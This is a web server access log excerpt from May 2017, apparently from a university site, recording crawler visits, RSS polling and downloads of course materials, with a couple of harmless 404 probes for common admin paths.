112.26.78.185 - - [21/May/2017:13:12:06 +0200] "HEAD /js/fckeditor/editor/ HTTP/1.1" 404 - "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
104.154.49.2 - - [21/May/2017:13:13:53 +0200] "GET /asbda2017/?feed=rss2 HTTP/1.1" 200 3487 "-" "Java/1.8.0_121"
212.83.174.55 - - [21/May/2017:13:14:02 +0200] "GET / HTTP/1.1" 200 11462 "-" "Mozilla"
5.164.117.93 - - [21/May/2017:13:14:47 +0200] "GET /courses/sd0910/lucidi/Pthread.pdf HTTP/1.1" 200 348460 "https://www.google.ru/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0"
5.164.117.93 - - [21/May/2017:13:14:48 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0"
87.7.187.81 - - [21/May/2017:13:14:59 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
180.76.15.148 - - [21/May/2017:13:15:49 +0200] "GET / HTTP/1.1" 200 11462 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.26 - - [21/May/2017:13:16:02 +0200] "GET / HTTP/1.1" 200 11462 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.75.63 - - [21/May/2017:13:16:04 +0200] "GET /~lopresti/Didattica/RetiWeb/Chapters/toprinter/Core-Servlets-and-JSP/Chapters/JSP-Including-Files.pdf HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.32 - - [21/May/2017:13:16:10 +0200] "GET /courses/PRSI/Lezione3PartII.pdf HTTP/1.1" 200 2754395 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.75.63 - - [21/May/2017:13:16:16 +0200] "GET /psblas/submitted2.ps HTTP/1.1" 404 248 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
87.7.187.81 - - [21/May/2017:13:18:29 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
104.197.197.203 - - [21/May/2017:13:18:42 +0200] "GET /acpross2017/?feed=rss2 HTTP/1.1" 200 3664 "-" "Java/1.8.0_121"
141.8.132.32 - - [21/May/2017:13:20:07 +0200] "GET /favicon.ico HTTP/1.1" 404 248 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
104.154.49.2 - - [21/May/2017:13:20:43 +0200] "GET /asbda2017/?feed=rss2 HTTP/1.1" 200 3487 "-" "Java/1.8.0_121"
157.55.39.52 - - [21/May/2017:13:20:57 +0200] "GET /psblas/UserGuide-3.0/img139.png HTTP/1.1" 200 10604 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
87.7.187.81 - - [21/May/2017:13:21:59 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
216.244.66.246 - - [21/May/2017:13:24:03 +0200] "GET /robots.txt HTTP/1.1" 404 297 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
87.7.187.81 - - [21/May/2017:13:25:30 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
66.249.75.3 - - [21/May/2017:13:26:17 +0200] "GET /~buttari/MiBe/page_IMG_2137.JPG.html HTTP/1.1" 200 555 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.22 - - [21/May/2017:13:26:31 +0200] "GET / HTTP/1.1" 200 3470 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.197.197.203 - - [21/May/2017:13:26:50 +0200] "GET /acpross2017/?feed=rss2 HTTP/1.1" 200 3664 "-" "Java/1.8.0_121"
167.57.56.192 - - [21/May/2017:13:27:30 +0200] "GET /wp-login.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
167.57.56.192 - - [21/May/2017:13:27:31 +0200] "GET / HTTP/1.1" 200 5735 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
104.154.49.2 - - [21/May/2017:13:27:39 +0200] "GET /asbda2017/?feed=rss2 HTTP/1.1" 200 3487 "-" "Java/1.8.0_121"
151.15.119.190 - - [21/May/2017:13:28:53 +0200] "GET /courses/sabd1617/slides/hands-on-hdfs.txt HTTP/1.1" 200 1528 "http://www.ce.uniroma2.it/courses/sabd1617/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
87.7.187.81 - - [21/May/2017:13:29:00 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
93.45.224.5 - - [21/May/2017:13:29:46 +0200] "GET /~valeria/ HTTP/1.1" 200 6053 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
